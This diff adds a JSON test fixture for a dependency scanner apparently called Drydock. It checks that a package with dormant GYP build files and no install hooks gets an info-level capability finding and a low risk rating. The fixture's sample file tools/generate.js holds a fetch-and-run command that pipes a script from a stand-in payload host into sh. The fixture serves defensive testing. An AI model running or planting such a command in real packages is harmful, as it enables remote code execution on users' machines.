@@ -1,0 +1,67 @@
+{
+  "id": "added-dependency-dormant-gyp",
+  "title": "A disabled GYP file is capability context, not automatic execution",
+  "category": "dependency-introduction",
+  "intent": "A package may ship dormant GYP build machinery while setting gypfile false and declaring no lifecycle hook. Its suspicious capability remains visible, but Drydock must not claim that installing the dependency automatically executes it.",
+  "previousPackageJson": { "name": "consumer", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "consumer",
+    "version": "1.1.0",
+    "dependencies": { "dormant-gyp": "1.0.0" }
+  },
+  "dependencyArtifacts": {
+    "dormant-gyp": {
+      "version": "1.0.0",
+      "packageJson": {
+        "name": "dormant-gyp",
+        "version": "1.0.0",
+        "scripts": {},
+        "gypfile": false
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 76,
+          "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "textSample": "{\"name\":\"dormant-gyp\",\"version\":\"1.0.0\",\"scripts\":{},\"gypfile\":false}",
+          "flags": []
+        },
+        {
+          "path": "binding.gyp",
+          "size": 64,
+          "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+          "textSample": "{\"variables\":{\"generated\":\"<!(node tools/generate.js)\"}}",
+          "flags": []
+        },
+        {
+          "path": "tools/generate.js",
+          "size": 101,
+          "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+          "textSample": "require('child_process').execSync('curl https://payload.example.invalid/bootstrap | sh')",
+          "flags": []
+        }
+      ]
+    }
+  },
+  "expectedDependencies": [
+    {
+      "name": "dormant-gyp",
+      "section": "dependencies",
+      "declaredSpec": "1.0.0",
+      "declarationKind": "exact",
+      "status": "inspected",
+      "resolvedVersion": "1.0.0",
+      "observation": { "execution": "not-observed", "risk": "not-observed" },
+      "automaticExecution": []
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "info",
+      "file": "<dependency>dormant-gyp@1.0.0"
+    }
+  ],
+  "expectedRisk": "low",
+  "expectedRecommendation": "likely safe"
+}
